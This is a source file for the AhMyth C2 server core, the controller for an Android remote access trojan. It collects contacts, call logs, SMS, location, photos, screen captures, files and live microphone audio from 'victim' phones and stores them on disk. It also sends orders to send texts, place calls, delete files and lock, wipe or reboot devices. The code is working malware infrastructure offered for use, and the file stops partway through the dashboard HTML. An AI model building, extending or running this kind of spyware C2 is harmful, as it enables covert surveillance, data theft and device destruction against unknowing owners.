#!/usr/bin/env node
/**
 * AhMyth C2 control panel -- standalone C2 server core (Node, no Electron).
 *
 * Protocol: the Android agent (socket.io-client-java 2.0.1) sends EIO=4 in
 * the handshake URL but speaks classic Engine.IO v3 polling framing, so this
 * server hand-rolls the long-poll transport exactly like the (proven stable)
 * Python mock in tools/mock_c2_test_client.py:
 *   - handshake GET  -> raw "0{...}" (no length prefix, no merged CONNECT)
 *   - poll GET       -> "\x1e"-joined queued packets, "" (empty body) when idle
 *   - POST           -> raw packets ("2" ping -> we answer "3" pong; "1" close;
 *                       "4..." socket.io messages; "b..." binary attachments)
 *   - connect ack    -> "40{\"sid\":...}" only AFTER the agent POSTs its "40"
 *   - heartbeat      -> client-driven (the app pings, we pong); app-level
 *                       "ping" events every HB_MS (default 10s), the app
 *                       answers "pong"
 *
 * Events from the agent (all optional, listeners attached per victim):
 *   ping/pong       app-level heartbeat
 *   x0000cn         contacts list        x0000cl  call logs
 *   x0000sm         sms inbox / send     x0000apps installed apps
 *   x0000ca         camera list / photo  x0000lm  location
 *   x0000mc         mic recording (binary buffer)
 *   x0000fm         file listing / download (binary buffer)
 *   x0000sc         screen capture (base64 image)
 *   x0000nt         notification stream
 *   x0000getAllImages / x0000getImage   gallery listing / photo
 *   audioData       live mic PCM chunk (base64)  audioDataStop  end of stream
 *   x0000dm / x0000openUrl / x0000runApp / x0000deleteFF / x0000lockDevice
 *   x0000wipeDevice / x0000rebootDevice   status responses
 *
 * The HTTP server also exposes the same dashboard + REST API as the mock
 * (/api/devices, /api/order, /api/log, /api/files, /files/...) so the tooling
 * in tools/ works unchanged against this server.
 *
 * Run standalone (no GUI) for a smoke test:
 *   node server.js --smoke
 * or interactively (type 'help' for orders, JSON payloads also accepted):
 *   node server.js
 *
 * The Electron main process (main.js) calls startServer() with callbacks.
 */
"use strict";

const fs = require("fs");
const http = require("http");
const os = require("os");
const path = require("path");
const readline = require("readline");
const crypto = require("crypto");
const { EventEmitter } = require("events");

const uuid = () => crypto.randomBytes(16).toString("hex");

// ---------------------------------------------------------------------------
// helpers
// ---------------------------------------------------------------------------

function sanitize(s) {
  return String(s == null ? "" : s).replace(/[^A-Za-z0-9._-]+/g, "_").slice(0, 64);
}

function stamp() {
  return new Date().toISOString().replace(/[:T]/g, "-").slice(0, 19);
}

function wavHeader(dataLen, rate = 16000, channels = 1, bits = 16) {
  const byteRate = (rate * channels * bits) / 8;
  const blockAlign = (channels * bits) / 8;
  const buf = Buffer.alloc(44);
  buf.write("RIFF", 0);
  buf.writeUInt32LE(36 + dataLen, 4);
  buf.write("WAVE", 8);
  buf.write("fmt ", 12);
  buf.writeUInt32LE(16, 16);          // fmt chunk size
  buf.writeUInt16LE(1, 20);           // PCM
  buf.writeUInt16LE(channels, 22);
  buf.writeUInt32LE(rate, 24);
  buf.writeUInt32LE(byteRate, 28);
  buf.writeUInt16LE(blockAlign, 32);
  buf.writeUInt16LE(bits, 34);
  buf.write("data", 36);
  buf.writeUInt32LE(dataLen, 40);
  return buf;
}

function renderText(name, data) {
  const t = stamp();
  const lines = (h) => [`# ${h}  (captured ${t})`, ""];
  if (name === "x0000cn" && Array.isArray(data.contactsList)) {
    const out = lines("Contacts");
    for (const c of data.contactsList) {
      out.push(`Name:    ${c.name || ""}`, `Number:  ${c.number || ""}`, "-".repeat(40));
    }
    return out.join("\n");
  }
  if (name === "x0000cl" && Array.isArray(data.callsList)) {
    const out = lines("Call log");
    for (const c of data.callsList) {
      out.push(`Name:      ${c.name || ""}`, `Number:    ${c.number || ""}`,
               `Duration:  ${c.duration || ""}`, "-".repeat(40));
    }
    return out.join("\n");
  }
  if (name === "x0000sm" && Array.isArray(data.smsList)) {
    const out = lines("SMS inbox");
    for (const m of data.smsList) {
      out.push(`From/To:  ${m.address || m.phone || ""}`, `Date:     ${m.date || ""}`,
               `Body:     ${m.msg || m.body || ""}`, "-".repeat(40));
    }
    return out.join("\n");
  }
  if (name === "x0000apps" && Array.isArray(data.appsList)) {
    const out = lines("Installed apps");
    for (const a of data.appsList) {
      out.push(`${a.appName || "?"}  (${a.packageName || "?"})  v${a.versionName || "?"}`);
    }
    return out.join("\n");
  }
  if (name === "x0000getAllImages" && Array.isArray(data.images)) {
    const out = lines("Device gallery");
    for (const im of data.images) {
      out.push(`Name:  ${im.imageName || ""}`, `Path:  ${im.imagePath || ""}`,
               `Size:  ${im.imageSize || "?"}  Date: ${im.imageDate || "?"}`, "-".repeat(40));
    }
    return out.join("\n");
  }
  if (name === "x0000lm" && typeof data === "object") {
    const out = lines("Location");
    out.push(`enable: ${data.enable}`);
    if (data.lat != null) out.push(`lat: ${data.lat}   lng: ${data.lng}`);
    if (data.provider) out.push(`provider: ${data.provider}`);
    if (data.accuracy != null) out.push(`accuracy: ${data.accuracy}m`);
    return out.join("\n");
  }
  return null;
}

function summarize(data) {
  if (Buffer.isBuffer(data)) return { buffer: `Buffer(${data.length})` };
  if (Array.isArray(data)) return data.map(summarize);
  if (data && typeof data === "object") {
    const out = {};
    for (const [k, v] of Object.entries(data)) {
      if (Buffer.isBuffer(v)) out[k] = `Buffer(${v.length})`;
      else out[k] = v;
    }
    return out;
  }
  return data;
}

// socket.io binary-attachment plumbing (protocol v5)
function placeholderCount(o) {
  if (Array.isArray(o)) return o.reduce((n, x) => n + placeholderCount(x), 0);
  if (o && typeof o === "object") {
    if (o._placeholder === true) return 1;
    return Object.values(o).reduce((n, x) => n + placeholderCount(x), 0);
  }
  return 0;
}

function fillPlaceholders(o, buf) {
  if (Array.isArray(o)) return o.map((x) => fillPlaceholders(x, buf));
  if (o && typeof o === "object") {
    if (o._placeholder === true && buf.length) return buf.shift();
    const out = {};
    for (const [k, v] of Object.entries(o)) out[k] = fillPlaceholders(v, buf);
    return out;
  }
  return o;
}

// ---------------------------------------------------------------------------
// server
// ---------------------------------------------------------------------------

function startServer(opts) {
  const {
    port = 42474,
    downloadDir = path.join(os.homedir(), "AhMyth", "Downloads"),
    onVictim = () => {},
    onVictimGone = () => {},
    onEvent = () => {},
    onAudioChunk = () => {},
    onAudioStop = () => {},
    onLog = () => {},
  } = opts;

  fs.mkdirSync(downloadDir, { recursive: true });

  // shared log ring (served at /api/log like the mock)
  const logBuffer = [];
  function log(msg) {
    const line = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logBuffer.push(line);
    if (logBuffer.length > 3000) logBuffer.splice(0, logBuffer.length - 3000);
    onLog(line);
  }
  log(`downloads -> ${downloadDir}`);
  log(`control-panel server listening on ${port} (Engine.IO long-polling)`);

  const victims = new Map();          // eio sid -> victim record

  // -- per-victim helpers ------------------------------------------------
  function devdir(v) {
    const d = path.join(downloadDir, sanitize(v.info.id) || sanitize(v.info.model) || v.sid.slice(0, 8));
    fs.mkdirSync(d, { recursive: true });
    return d;
  }

  function save(v, name, data) {
    const d = devdir(v);
    const base = `${stamp().replace(/[-:]/g, "")}_${sanitize(name)}`;
    // binary payload (mic recording, downloaded file)
    if (data && typeof data === "object" && Buffer.isBuffer(data.buffer)) {
      const raw = data.buffer;
      const fname = sanitize(data.name) || `${name}.bin`;
      const bpath = path.join(d, `${base}_${fname}`);
      fs.writeFileSync(bpath, raw);
      const meta = { ...data, buffer: `<${raw.length} bytes saved as ${path.basename(bpath)}>` };
      fs.writeFileSync(path.join(d, `${base}.json`), JSON.stringify(meta, null, 2));
      log(`[*] saved binary ${path.basename(bpath)} (${raw.length} bytes)`);
      return;
    }
    // base64 photo / screen capture / gallery image
    if (data && data.base64 && data.image === true) {
      const raw = Buffer.from(data.base64, "base64");
      const ipath = path.join(d, `${base}.jpg`);
      fs.writeFileSync(ipath, raw);
      const meta = { ...data, base64: `<${raw.length} bytes saved as ${path.basename(ipath)}>` };
      fs.writeFileSync(path.join(d, `${base}.json`), JSON.stringify(meta, null, 2));
      log(`[*] saved photo ${path.basename(ipath)} (${raw.length} bytes)`);
      return;
    }
    const raw = JSON.stringify(data, null, 2);
    fs.writeFileSync(path.join(d, `${base}.json`), raw);
    const txt = renderText(name, data);
    if (txt) fs.writeFileSync(path.join(d, `${base}.txt`), txt);
    log(`[*] saved ${name} response (${raw.length} bytes)`);
  }

  function attach(v) {
    const s = v.socket;
    const names = [
      "x0000cn", "x0000cl", "x0000sm", "x0000apps", "x0000ca", "x0000lm",
      "x0000mc", "x0000fm", "x0000sc", "x0000nt", "x0000getAllImages",
      "x0000getImage", "x0000dm", "x0000openUrl", "x0000runApp",
      "x0000deleteFF", "x0000lockDevice", "x0000wipeDevice", "x0000rebootDevice",
    ];
    for (const n of names) {
      s.on(n, (data) => {
        save(v, n, data);
        onEvent(v, n, data);
      });
    }
    // live mic stream (chunks arrive as audioData, WAV finalized on stop)
    let wavPath = null;
    let pcm = [];
    v.micArmed = false;  // true only after a x0000listenMic order is sent
    s.on("audioData", (b64) => {
      if (!wavPath) {
        // A trailing in-flight chunk can arrive after audioDataStop; without
        // an armed stream it would recreate a phantom empty WAV. Drop it.
        if (!v.micArmed) return;
        v.micArmed = false;
        wavPath = path.join(devdir(v), `micstream_${stamp().replace(/[-:]/g, "")}.wav`);
        fs.writeFileSync(wavPath, wavHeader(0));
        log(`[*] mic stream started -> ${path.basename(wavPath)}`);
      }
      try { pcm.push(Buffer.from(b64, "base64")); } catch (e) { /* skip bad chunk */ }
      onAudioChunk(v, b64);
    });
    s.on("audioDataStop", (reason) => {
      v.micArmed = false;
      if (wavPath) {
        const data = Buffer.concat(pcm);
        const fh = fs.openSync(wavPath, "r+");
        fs.writeSync(fh, wavHeader(data.length), 0, 44);
        fs.writeSync(fh, data, 0, data.length, 44);   // full body at file offset 44
        fs.closeSync(fh);
        log(`[*] mic stream saved ${path.basename(wavPath)} (${data.length} bytes)`);
        wavPath = null;
        pcm = [];
      }
      onAudioStop(v, reason || "stop");
    });
    s.on("disconnect", () => {
      victims.delete(v.sid);
      onVictimGone(v);
    });
  }

  function newSession(q, ip) {
    const v = {
      sid: uuid(),
      socket: new EventEmitter(),
      ip,
      info: { model: q.model || "", manf: q.manf || "", release: q.release || "", id: q.id || "" },
      connectedAt: Date.now(),
      sioSid: null,
      connected: false,
      closed: false,
      packets: [],          // outbound Engine.IO packet strings
      waiters: [],          // pending long-poll { res, timer }
      binBuf: [],           // incoming binary attachments, in num order
      pendingBinary: [],    // events waiting for their attachments
      lastActivity: Date.now(),
    };
    // EventEmitter that also maps the two server->agent emissions:
    //   "ping"  -> 42["ping"]      (app-level heartbeat)
    //   "order" -> 42["order",<payload>]
    v.socket.emit = (name, ...args) => {
      if (name === "ping") { queuePacket(v, '42["ping"]'); return true; }
      if (name === "order") {
        const one = args.length <= 1 ? args[0] : args;
        queuePacket(v, `42["order",${JSON.stringify(one)}]`);
        return true;
      }
      return EventEmitter.prototype.emit.call(v.socket, name, ...args);
    };
    v.socket.disconnect = () => closeDevice(v, "server kick");

    // one live session per device id: kick any older session for the same id
    for (const old of Array.from(victims.values())) {
      if (old !== v && old.info.id && old.info.id === v.info.id) {
        try { old.socket.disconnect(); } catch (e) { /* ignore */ }
      }
    }
    victims.set(v.sid, v);
    attach(v);
    log(`[+] engine.io session  ${v.sid.slice(0, 8)}  (EIO=4)  model=${v.info.model || "?"} manf=${v.info.manf || "?"} android=${v.info.release || "?"} id=${v.info.id || "?"}`);
    onVictim(v);
    return v;
  }

  function closeDevice(v, reason) {
    if (v.closed) return;
    v.closed = true;
    victims.delete(v.sid);
    while (v.waiters.length) respondPoll(v, v.waiters.shift());
    log(`[-] device closed   sid=${v.sid.slice(0, 8)}${reason ? `  reason=${reason}` : ""}`);
    v.socket.emit("disconnect");
  }

  // -- polling -----------------------------------------------------------
  function queuePacket(v, pkt) {
    v.packets.push(pkt);
    flushPoll(v);
  }

  function flushPoll(v) {
    if (v.packets.length && v.waiters.length) respondPoll(v, v.waiters.shift());
  }

  function respondPoll(v, w) {
    clearTimeout(w.timer);
    const out = v.closed || !v.packets.length ? "" : v.packets.join("\x1e");
    v.packets = [];
    if (process.env.TRACE) log(`    POLL out (${v.sid.slice(0, 8)}) ${w.started ? Date.now() - w.started : 0}ms ${JSON.stringify(out.slice(0, 60))}`);
    w.res.writeHead(200, {
      "Content-Type": "text/plain; charset=UTF-8",
      "Content-Length": Buffer.byteLength(out),
      "Access-Control-Allow-Origin": "*",
    });
    w.res.end(out);
  }

  function handlePoll(v, res) {
    v.lastActivity = Date.now();
    if (process.env.TRACE) log(`    POLL in  (${v.sid.slice(0, 8)})`);
    if (v.waiters.length) { res.writeHead(500); res.end(); log("[?] poll overlap"); return; }
    if (v.packets.length) { respondPoll(v, { res, timer: null }); return; }
    const w = { res, timer: null, started: Date.now() };
    v.waiters.push(w);
    // Hold the long-poll up to 20s: socket.io-client-java 2.0.1 churns on
    // short empty polls (~8s) but tolerates the classic 20s hold. The app's
    // OkHttp read timeout is 10s, so the heartbeat MUST wake every poll well
    // before that (HB_MS) or the app closes the session (read timeout).
    w.timer = setTimeout(() => {
      const i = v.waiters.indexOf(w);
      if (i >= 0) { v.waiters.splice(i, 1); respondPoll(v, w); }
    }, 20000);
  }

  // -- inbound packets ---------------------------------------------------
  function handlePost(v, body) {
    v.lastActivity = Date.now();
    const chunks = body.split("\x1e").map((c) => c.trim()).filter(Boolean);
    // pass 1: binary attachments first (b<base64>), then flush waiting events
    let gotBinary = false;
    for (const pkt of chunks) {
      if (pkt[0] === "b") {
        gotBinary = true;
        try { v.binBuf.push(Buffer.from(pkt.slice(1), "base64")); } catch (e) { /* skip */ }
      }
    }
    if (gotBinary) flushPendingBinary(v);
    // pass 2: text packets
    for (const pkt of chunks) {
      const t = pkt[0];
      if (t === "b") continue;
      if (t === "2") queuePacket(v, "3");            // engine.io ping -> pong
      else if (t === "3") { /* pong (EIO3 clients) */ }
      else if (t === "1") closeDevice(v, "client close");
      else if (t === "4") handleSioPacket(v, pkt.slice(1));
      else if (t === "5" || t === "6") { /* upgrade / noop */ }
    }
  }

  function handleSioPacket(v, payload) {
    if (!payload) return;
    const st = payload[0];
    if (st === "0") {                                  // connect
      v.sioSid = uuid();
      v.connected = true;
      // The agent REQUIRES the connect ack to carry {"sid": ...} (it rejects
      // a bare "40" with connect_error), so ack with the sio sid.
      queuePacket(v, `40{"sid":"${v.sioSid}"}`);
      const n = Array.from(victims.values()).filter((d) => d.connected).length;
      log(`[+] DEVICE CONNECTED  eio=${v.sid.slice(0, 8)} sio=${v.sioSid.slice(0, 8)}  model=${v.info.model || "?"} manf=${v.info.manf || "?"} android=${v.info.release || "?"} device_id=${v.info.id || "?"}  (${n} connected)`);
    } else if (st === "1") {                           // disconnect
      log(`[!] socket.io disconnect from ${v.sid.slice(0, 8)}`);
      closeDevice(v, "socket.io disconnect");
    } else if (st === "2") {                           // event
      let name, args;
      try {
        const data = JSON.parse(payload.slice(1));
        name = data[0];
        args = data.slice(1);
      } catch (e) {
        name = "<unparsed>";
        args = [payload.slice(1)];
      }
      emitEvent(v, name, args);
    } else if (st === "5") {                           // binary event
      binaryEvent(v, payload.slice(1));
    }
    // 3 (ack), 4 (error), 6 (binary ack): ignored
  }

  function binaryEvent(v, payload) {
    // socket.io v5 binary event: 5<attachments>-<json>
    const dash = payload.indexOf("-");
    if (dash !== -1 && /^\d+$/.test(payload.slice(0, dash))) payload = payload.slice(dash + 1);
    let name, args;
    try {
      const data = JSON.parse(payload);
      name = data[0];
      args = data.slice(1);
    } catch (e) {
      log(`[<] <binary event>  <- ${v.sid.slice(0, 8)} (unparseable)`);
      return;
    }
    const needed = placeholderCount(args);
    if (needed <= v.binBuf.length) {
      const buf = v.binBuf.splice(0, needed);
      emitEvent(v, name, fillPlaceholders(args, buf));
    } else {
      v.pendingBinary.push({ name, args, needed });
    }
  }

  function flushPendingBinary(v) {
    if (!v.pendingBinary.length) return;
    const remaining = [];
    for (const { name, args, needed } of v.pendingBinary) {
      if (needed <= v.binBuf.length) {
        const buf = v.binBuf.splice(0, needed);
        emitEvent(v, name, fillPlaceholders(args, buf));
      } else {
        remaining.push({ name, args, needed });
      }
    }
    v.pendingBinary = remaining;
  }

  function emitEvent(v, name, args) {
    if (name === "pong") {
      log(`[<] pong  <- ${v.sid.slice(0, 8)}   (app-level heartbeat reply)`);
      return;
    }
    const data = args.length === 1 ? args[0] : args;
    if (name === "audioData") { v.socket.emit("audioData", data); return; }
    if (name === "audioDataStop") {
      v.socket.emit("audioDataStop", typeof data === "string" ? data : "stop");
      return;
    }
    log(`[<] ${name}  <- ${v.sid.slice(0, 8)}`);
    v.socket.emit(name, data);
  }

  // -- orders ------------------------------------------------------------
  function armMic(v, payload) {
    if (payload && payload.order === "x0000listenMic") v.micArmed = true;
  }

  function sendOrderTo(sidFilter, payload) {
    let n = 0;
    for (const v of victims.values()) {
      if (!v.connected || v.closed) continue;
      if (sidFilter && !v.sid.startsWith(sidFilter)) continue;
      armMic(v, payload);
      log(`[->] order -> ${v.sid.slice(0, 8)} : ${JSON.stringify(payload)}`);
      v.socket.emit("order", payload);
      n++;
    }
    return n;
  }

  // -- heartbeats / housekeeping -----------------------------------------
  const mon = setInterval(() => {
    const now = Date.now();
    for (const v of Array.from(victims.values())) {
      if (v.closed) continue;
      // EIO=4 sessions are client-ping driven (the app pings, we pong), so
      // reap sessions gone silent (no HTTP for 2x ping timeout = 120s) --
      // otherwise the dashboard lists zombies forever.
      if (now - v.lastActivity > 120000) {
        log(`[!] session silent for ${Math.round((now - v.lastActivity) / 1000)}s, closing ${v.sid.slice(0, 8)}`);
        closeDevice(v, "silent");
      }
    }
  }, 10000);

  // App-level heartbeat. The agent's OkHttp read timeout is 10s, and its
  // poll cycle phase-locks to the heartbeat (a poll that starts right at a
  // tick gets held exactly one interval). A 10s interval means polls are
  // routinely held 10.0s -> the read timeout aborts them -> the app closes
  // and reconnects in a ~30s churn loop. 5s guarantees every poll returns
  // well under the timeout regardless of phase alignment.
  const hbMs = Math.max(parseInt(process.env.HB_MS || "5000", 10) || 5000, 0);
  const hb = setInterval(() => {
    if (process.env.TRACE) log(`    HB tick (${hbMs}ms)`);
    for (const v of victims.values()) {
      if (v.connected && !v.closed) {
        try { v.socket.emit("ping"); } catch (e) { /* ignore */ }
      }
    }
  }, hbMs);

  // -- captured files listing ---------------------------------------------
  function files(limit = 200) {
    const out = [];
    let entries = [];
    try { entries = fs.readdirSync(downloadDir); } catch (e) { return out; }
    for (const dname of entries.sort()) {
      const dpath = path.join(downloadDir, dname);
      try { if (!fs.statSync(dpath).isDirectory()) continue; } catch (e) { continue; }
      let names = [];
      try { names = fs.readdirSync(dpath); } catch (e) { continue; }
      for (const fname of names.sort().reverse()) {
        const fpath = path.join(dpath, fname);
        try { if (!fs.statSync(fpath).isFile()) continue; } catch (e) { continue; }        const st = fs.statSync(fpath);
        // filename: <timestamp>_<order>[_<name>]  (or micstream_<ts>.wav)
        const parts = fname.split("_");
        const order = parts.length > 1 ? parts[1].split(".")[0] : "";
        out.push({
          device: dname, name: fname, order,
          size: st.size, mtime: st.mtimeMs / 1000,
          url: `/files/${encodeURIComponent(dname)}/${encodeURIComponent(fname)}`,
        });
        if (out.length >= limit) return out;
      }
    }
    return out;
  }

  // -- HTTP server ---------------------------------------------------------
  const server = http.createServer((req, res) => {
    let u;
    try { u = new URL(req.url, "http://127.0.0.1"); } catch (e) {
      res.writeHead(400); res.end("bad request"); return;
    }
    const p = u.pathname;
    const q = u.searchParams;

    const send = (code, body, ctype = "text/plain; charset=UTF-8") => {
      const b = Buffer.isBuffer(body) ? body : Buffer.from(String(body == null ? "" : body), "utf8");
      res.writeHead(code, {
        "Content-Type": ctype,
        "Content-Length": b.length,
        "Access-Control-Allow-Origin": "*",
      });
      res.end(b);
    };

    // dashboard + REST API (same contract as the mock)
    if (p === "/" || p === "/index.html") return send(200, DASHBOARD_HTML, "text/html; charset=UTF-8");
    if (p === "/api/devices") {
      const devs = Array.from(victims.values())
        .filter((d) => d.connected)
        .map((d) => ({ sid: d.sid, model: d.info.model, manf: d.info.manf, release: d.info.release, id: d.info.id }));
      return send(200, JSON.stringify(devs), "application/json");
    }
    if (p === "/api/log") {
      const since = parseInt(q.get("since") || "0", 10) || 0;
      return send(200, JSON.stringify({ next: logBuffer.length, lines: logBuffer.slice(since) }), "application/json");
    }
    if (p === "/api/order" && req.method === "POST") {
      return readBody(req, (raw) => {
        let reqBody;
        try { reqBody = JSON.parse(raw.toString("utf8") || "{}"); } catch (e) {
          return send(400, JSON.stringify({ error: "bad json" }), "application/json");
        }
        const cmd = reqBody.order || "";
        const target = reqBody.target || null;
        const parsed = parseCommand(cmd);
        if (!parsed) return send(400, JSON.stringify({ error: "unknown order" }), "application/json");
        const n = sendOrderTo(target, parsed.payload);
        return send(200, JSON.stringify({ sent: n }), "application/json");
      });
    }
    if (p === "/api/files") return send(200, JSON.stringify(files()), "application/json");
    if (p === "/api/config-template") return send(200, CONFIG_TEMPLATE, "application/json");
    if (p.startsWith("/files/")) {
      const rel = decodeURIComponent(p.slice("/files/".length)).replace(/\\/g, "/");
      if (rel.startsWith("/") || rel.split("/").includes("..")) return send(400, "invalid path");
      const fpath = path.join(downloadDir, rel);
      let data;
      try {
        const st = fs.statSync(fpath);
        if (st.size > 64 * 1024 * 1024) return send(413, "file too large");
        data = fs.readFileSync(fpath);
      } catch (e) { return send(404, "not found"); }
      res.writeHead(200, {
        "Content-Type": "text/plain; charset=UTF-8",
        "Content-Length": data.length,
        "Content-Disposition": `attachment; filename="${path.basename(rel)}"`,
        "Access-Control-Allow-Origin": "*",
      });
      return res.end(data);
    }

    // engine.io long-polling transport
    if (p !== "/socket.io/") {
      log(`[?] rejected: ${req.method} ${req.url.slice(0, 200)}`);
      return send(400, "invalid path");
    }
    if (q.get("transport") !== "polling") {
      log(`[?] rejected transport: ${req.url.slice(0, 120)}`);
      return send(400, "unsupported transport");
    }
    if (!["3", "4"].includes(q.get("EIO"))) {
      log(`[?] rejected EIO: ${req.url.slice(0, 120)}`);
      return send(400, "unsupported Engine.IO version");
    }
    const sid = q.get("sid");
    if (!sid) {
      if (req.method === "GET") {
        const v = newSession(queryInfo(q), (req.socket.remoteAddress || "").replace(/^.*:/, ""));
        const body = JSON.stringify({ sid: v.sid, upgrades: [], pingInterval: 25000, pingTimeout: 60000 });
        log(`    GET handshake -> sid ${v.sid.slice(0, 8)}`);
        return send(200, "0" + body);
      }
      return send(400, "bad request");
    }
    const v = victims.get(sid);
    if (!v || v.closed) {
      log(`[?] unknown sid: ${sid.slice(0, 12)}`);
      return send(400, "unknown sid");
    }
    if (req.method === "GET") return handlePoll(v, res);
    if (req.method === "POST") {
      return readBody(req, (raw) => {
        let body = raw.toString("utf8");
        if (q.get("b64") === "1") {
          try { body = Buffer.from(body, "base64").toString("utf8"); } catch (e) { /* keep raw */ }
        }
        log(`    POST <- ${JSON.stringify(body.slice(0, 140))} (sid ${sid.slice(0, 8)})`);
        handlePost(v, body);
        send(200, "ok");
      });
    }
    return send(400, "bad request");
  });

  server.on("error", (err) => log(`! server error: ${err.message}`));
  server.listen(port);

  return {
    io: null,
    victims,
    sendOrder(victimId, payload) {
      const v = victims.get(victimId);
      if (!v || v.closed) return 0;
      armMic(v, payload);
      v.socket.emit("order", payload);
      return 1;
    },
    broadcastOrder(payload) {
      let n = 0;
      for (const v of victims.values()) {
        if (v.connected && !v.closed) {
          armMic(v, payload);
          v.socket.emit("order", payload); n++;
        }
      }
      return n;
    },
    stop() {
      clearInterval(mon);
      clearInterval(hb);
      for (const v of Array.from(victims.values())) closeDevice(v, "shutdown");
      server.close();
    },
  };
}

function readBody(req, cb) {
  const chunks = [];
  req.on("data", (c) => chunks.push(c));
  req.on("end", () => cb(Buffer.concat(chunks)));
  req.on("error", () => cb(Buffer.alloc(0)));
}

function queryInfo(q) {
  return {
    model: q.get("model") || "",
    manf: q.get("manf") || "",
    release: q.get("release") || "",
    id: q.get("id") || "",
  };
}

// ---------------------------------------------------------------------------
// order prompt (same contract as the mock's parse_command)
// ---------------------------------------------------------------------------

const SIMPLE = {
  lm: { order: "x0000lm" },
  cn: { order: "x0000cn" },
  cl: { order: "x0000cl" },
  apps: { order: "x0000apps" },
  sms: { order: "x0000sm", extra: "ls" },
  ca: { order: "x0000ca", extra: "camList" },
  sc: { order: "x0000sc" },
};

const HELP = `Orders (sent to every connected device; responses are saved as .json + readable .txt):
  lm            location (lat/lng/provider/accuracy)   cn       contacts
  cl            call logs          apps          installed apps
  sms           SMS inbox          ca            camera list
  sc            screen capture*    cam-on [0|1]  take photo, no UI (0=back 1=front)
  mc <sec>       record mic <sec>s    mic-live    toggle real-time mic stream
  img-ls         gallery listing      img-dl <path>  fetch image (saved as .jpg)
  fm-ls <path>  list directory     fm-dl <path>  download file
  sms-send <to> <text>             run-app <pkg>   e.g. com.android.settings
  open-url <url>                   delete <path>    delete on device
  call <number>                    lock / wipe / reboot  (device actions!)
  raw <json>    send arbitrary order payload
  who / help / quit
* needs the screen-capture grant given during first app launch.`;

function parseCommand(line) {
  const tokens = line.split(/\s+/);
  const cmd = (tokens[0] || "").toLowerCase();
  const rest = tokens.slice(1);
  if (!cmd) return null;

  if (SIMPLE[cmd]) return { payload: SIMPLE[cmd] };
  if (cmd === "cam-on") return { payload: { order: "x0000ca", extra: rest[0] || "1" } };
  if (cmd === "mc" && rest.length === 1 && /^\d+$/.test(rest[0]))
    return { payload: { order: "x0000mc", sec: parseInt(rest[0], 10) } };
  if (cmd === "mic-live") return { payload: { order: "x0000listenMic" } };
  if (cmd === "img-ls") return { payload: { order: "x0000getAllImages" } };
  if (cmd === "img-dl" && rest.length === 1) return { payload: { order: "x0000getImage", path: rest[0] } };
  if (cmd === "fm-ls" && rest.length === 1) return { payload: { order: "x0000fm", extra: "ls", path: rest[0] } };
  if (cmd === "fm-dl" && rest.length === 1) return { payload: { order: "x0000fm", extra: "dl", path: rest[0] } };
  if (cmd === "sms-send" && rest.length >= 2)
    return { payload: { order: "x0000sm", extra: "sendSMS", to: rest[0], sms: rest.slice(1).join(" ") } };
  if (cmd === "run-app" && rest.length === 1) return { payload: { order: "x0000runApp", extra: rest[0] } };
  if (cmd === "open-url" && rest.length === 1) return { payload: { order: "x0000openUrl", url: rest[0] } };
  if (cmd === "delete" && rest.length === 1) return { payload: { order: "x0000deleteFF", fileFolderPath: rest[0] } };
  if (cmd === "call" && rest.length === 1) return { payload: { order: "x0000dm", number: rest[0] } };
  if (cmd === "lock") return { payload: { order: "x0000lockDevice" } };
  if (cmd === "wipe") return { payload: { order: "x0000wipeDevice" } };
  if (cmd === "reboot") return { payload: { order: "x0000rebootDevice" } };
  if (cmd === "raw" && rest.length) {
    try { return { payload: JSON.parse(rest.join(" ")) }; } catch (e) { /* fall through */ }
  }
  return null;
}

const CONFIG_TEMPLATE = JSON.stringify({
  url: "http://127.0.0.1:42474",
  device_id: "my-test-device",
}, null, 2) + "\n";

// ---------------------------------------------------------------------------
// web dashboard (same single-page console as the mock)
// ---------------------------------------------------------------------------

const DASHBOARD_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>AhMyth C2 &middot; control panel</title>
<style>
  :root { --bg:#0d1117; --panel:#161b22; --border:#30363d; --fg:#e6edf3; --dim:#8b949e;
          --accent:#58a6ff; --ok:#3fb950; --warn:#d29922; --danger:#f85149; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font:14px/1.45 ui-monospace,SFMono-Regular,Menlo,monospace; }
  header { padding:14px 20px; border-bottom:1px solid var(--border); display:flex; align-items:baseline; gap:14px; }
  header h1 { font-size:16px; margin:0; }
  header .count { color:var(--dim); }
  main { padding:20px; display:grid; grid-template-columns: 340px 1fr; gap:20px; }
  @media (max-width:900px){ main { grid-template-columns:1fr; } }
  .card { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px; }
  .card h2 { margin:0 0 10px; font-size:12px; text-transform:uppercase; letter-spacing:.08em; color:var(--dim); }
  .dev { padding:10px; border:1px solid var(--border); border-radius:8px; margin-bottom:8px; cursor:pointer; transition:border-color .15s; }
  .dev.sel { border-color:var(--accent); box-shadow:0 0 0 1px var(--accent); }
  .dev .top { display:flex; justify-content:space-between; }
  .dev .model { font-weight:600; }
  .dot { width:8px; height:8px; border-radius:50%; background:var(--ok); display:inline-block; margin-right:6px; }
  .dev .meta { color:var(--dim); font-size:12px; margin-top:4px; }
  .btns { display:grid; grid-template-columns:repeat(auto-fill,minmax(92px,1fr)); gap:8px; margin-top:10px; }
  button { background:#21262d; color:var(--fg); border:1px solid var(--border); border-radius:7px; padding:8px 10px;
           font:inherit; cursor:pointer; transition:background .15s,border-color .15s; }
  button:hover { background:#30363d; border-color:var(--accent); }
  button.warn { border-color:var(--warn); } button.warn:hover { background:#3a2f12; }
  button.danger { border-color:var(--danger); } button.danger:hover { background:#3d1416; }
  .row { display:flex; gap:8px; margin-top:10px; }
  input[type=text] { flex:1; background:#0d1117; color:var(--fg); border:1px solid var(--border); border-radius:7px; padding:8px 10px; font:inherit; }
  #log { height:460px; overflow-y:auto; background:#0d1117; border:1px solid var(--border); border-radius:8px; padding:10px; font-size:12px; }
  #log .in { color:var(--accent); } #log .out { color:var(--ok); } #log .err { color:var(--danger); } #log .dim { color:var(--dim); }
  #files a { display:block; padding:5px 8px; margin-bottom:4px; background:#0d1117; border:1px solid var(--border); border-radius:6px; color:var(--fg); text-decoration:none; font-size:12px; }
  #files a:hover { border-color:var(--accent); color:var(--accent); }
</style>
</head>
<body>
<header><h1>AhMyth C2 &middot; control panel</h1><span class="count" id="count">0 connected</span></header>
<main>
  <div>
    <div class="card"><h2>Devices &mdash; click to target</h2><div id="devs"><p class="dim">waiting&hellip;</p></div></div>
